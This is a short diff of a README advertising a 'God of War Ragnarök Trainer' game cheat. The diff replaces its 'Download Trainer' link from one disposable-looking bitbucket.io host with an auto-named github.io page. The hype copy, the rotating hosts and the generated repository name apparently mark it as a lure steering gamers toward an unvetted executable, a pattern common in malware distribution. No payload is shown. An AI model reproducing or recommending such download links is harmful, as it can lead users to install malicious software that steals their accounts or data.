@@ -4,7 +4,7 @@
 
 With a single button press, you control health, rage, gear, and time itself.
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload9.bitbucket.io)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://God-of-War-Ragnarok-Trainer-wyw1.github.io/.github)
 ---
 
 ## 🎮 What Is a God of War Ragnarök Trainer?
